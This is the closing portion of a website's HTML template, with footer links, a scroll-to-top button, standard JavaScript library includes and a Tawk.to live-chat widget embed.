                            <li class="list-inline-item"><a class="small-text" href="terms-condition.html">Terms & Condition</a></li>
                            <li class="list-inline-item"><a class="small-text" href="#">Security</a></li>
                            <li class="list-inline-item"><a class="small-text" href="privacy-policy.html">Privacy Policy</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!--footer bottom copyright end-->
    <!--footer section end-->
    <!--scroll bottom to top button start-->
    <div class="scroll-top scroll-to-target primary-bg text-white" data-target="html">
        <span class="fas fa-hand-point-up"></span>
    </div>
    <!--scroll bottom to top button end-->
    <!--build:js-->
    <script src="assets/js/vendors/jquery-3.5.1.min.js"></script>
    <script src="assets/js/vendors/popper.min.js"></script>
    <script src="assets/js/vendors/bootstrap.min.js"></script>
    <script src="assets/js/vendors/bootstrap-slider.min.js"></script>
    <script src="assets/js/vendors/jquery.easing.min.js"></script>
    <script src="assets/js/vendors/owl.carousel.min.js"></script>
    <script src="assets/js/vendors/countdown.min.js"></script>
    <script src="assets/js/vendors/jquery.waypoints.min.js"></script>
    <script src="assets/js/vendors/jquery.rcounterup.js"></script>
    <script src="assets/js/vendors/magnific-popup.min.js"></script>
    <script src="assets/js/vendors/validator.min.js"></script>
    <script src="assets/js/vendors/hs.megamenu.js"></script>
    <script src="assets/js/app.js"></script>
    <!--endbuild-->
    
    
    <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/5fbce023920fc91564ca1709/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
    
    
    
    
    
    
    
    
</body>

</html>
